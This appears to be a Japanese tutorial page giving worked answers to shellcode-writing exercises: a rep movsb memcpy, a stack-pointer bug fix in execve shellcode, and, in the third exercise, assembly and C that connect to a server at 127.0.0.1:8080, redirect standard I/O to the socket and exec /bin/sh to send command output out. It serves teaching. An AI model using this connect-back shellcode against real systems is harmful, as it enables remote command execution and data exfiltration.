---
title: 例題の解答 - シェルコードの書き方
date: 2022-02-06 14:04:00
lang: ja
---

## 例題１
【問題】
`rep movsb`命令を使ってmemcpy相当のシェルコードを書いてください。

【解答】
`rep`プレフィックスは後続の命令をrcxが0になるまでrcxをデクリメントしながら実行します。今回は`movsb`(1バイトずつコピー)なので、コピーするデータの長さをそのままrcxに入れましょう。
次に`movs`命令はrsiが指す先のデータをrdiが指す先にコピーします。命令が実行されるとrsi,rdiの値が更新されますが、デクリメントされるかインクリメントされるかはディレクションフラグに依存します。インクリメントさせたい場合はディレクションフラグを0にするため`cld`命令を呼びます。デクリメントさせたい場合は`std`命令を呼びます。今回は`movs`命令が呼ばれる度にポインタをインクリメントしたいので、`cld`を使います。
```
; memcpy(rdi, rsi, rdx);
cld
mov rcx, rdx
rep movsb
```

## 例題２
【問題】
シェルコード領域は書き込み可能だがRSPの初期値が0から始まる状況で、次のようなシェルコードを書いたところ、Segmentation Faultを起こしてしまいました。
```
global _start
section .text
_start:
  xor esp, esp    ; 初期状態RSP=0
  lea rsp, [rel stack]
  xor edx, edx
  push rdx
  lea rdi, [rel s_arg2]
  push rdi
  lea rdi, [rel s_arg1]
  push rdi
  lea rdi, [rel s_arg0]
  push rdi
  mov rsi, rsp
  mov eax, 59
  syscall
  int3
stack: times 1024 dq 0
s_arg0: db "/bin/sh", 0
s_arg1: db "-c", 0
s_arg2: db "/bin/ls -lha", 0
```
原因を特定して直してください。（ヒント：textセクションを書き込み可能にするにはldに`--omagic`オプションを渡す。）

【解答】
このシェルコードではスタックを利用するためにスタックポインタをシェルコード領域に設定しています。
```
lea rsp, [rel stack]
```
スタックは低位アドレスに向かって利用されますが、ラベル`stack`は用意されたスタック領域の先頭を指しています。したがって、以降`push`命令が呼ばれると機械語領域を破壊してしまいます。
5行目を次のように変更すればスタックポインタの位置は正しくなります。
```
lea rsp, [rel stack + 1024]
```
なお、ユーザーランドの場合はこれで問題ないですが、もしカーネル空間でこのような処理をする場合、アラインメントに注意する必要があります。カーネルではスタックポインタが8の倍数でないと例外を引き起こしてしまうため、次のように`align`を利用しましょう。
```
align 8
stack: times 1024 dq 0
```
ファイルの全体は[ここ](src/bug-fixed.S)からダウンロードできます。

## 例題３
【問題】
「ls -lha」した結果を自分のサーバー（例：127.0.0.1:8080）に送信するシェルコードを書いてください。（ヒント：標準入出力をsocketのfdにdupするとpipeを作らなくてもexecveするだけで結果が転送される。） 

【解答】
特殊な構造体が出てくるような複雑なシェルコードを書くのが難しい時はC言語で書いてコンパイルしたものを参考にしましょう。今回のコードは次のようになります。
```c
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
  struct sockaddr_in sa;
  int sock;

  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  sa.sin_port = htons(8080);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  connect(sock, (struct sockaddr*)&sa, sizeof(sa));
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);

  char *args[] = {"/bin/sh", "-c", "/bin/ls -lha", 0};
  execve(args[0], args, NULL);
  return 0;
}
```
`inet_addr`等の変換結果はgdbで確認すれば分かります。（といっても`inet_addr`はIPアドレスを4バイトの値に変換し、`htons`はポート番号のエンディアンを変換するだけです。）
解答例は以下のようになります。
```
global _start
section .text

_start:
  ; socket(AF_INET, SOCK_STREAM, 0)
  xor edx, edx
  mov esi, 1
  mov edi, 2
  mov eax, 41
  syscall
  mov r15d, eax
  ; connect(sock, &sa, sizeof(sa))
  mov edx, 0x10
  lea rsi, [rel sa]
  mov edi, r15d
  mov eax, 42
  syscall
  ; dup2(sock, 0)
  xor esi, esi
  mov edi, r15d
  mov eax, 33
  syscall
  ; dup2(sock, 1)
  mov esi, 1
  mov edi, r15d
  mov eax, 33
  syscall
  ; dup2(sock, 2)
  mov esi, 2
  mov edi, r15d
  mov eax, 33
  syscall
  ; execve(args[0], args, NULL)
  xor edx, edx
  push rdx
  lea rdi, [rel s_arg2]
  push rdi
  lea rdi, [rel s_arg1]
  push rdi
  lea rdi, [rel s_arg0]
  push rdi
  mov rsi, rsp
  mov eax, 59
  syscall
  int3

s_arg0:
  db "/bin/sh", 0
s_arg1:
  db "-c", 0
s_arg2:
  db "/bin/ls -lha", 0

sa:
  dw 2                          ; sin_family=AF_INET
  dw 0x901f                     ; sin_port=8080
  dd 0x0100007f                 ; sin_addr.s_addr=<127.0.0.1>
  dq 0
```
ファイルの全体は[ここ](src/revls.S)からダウンロードできます。
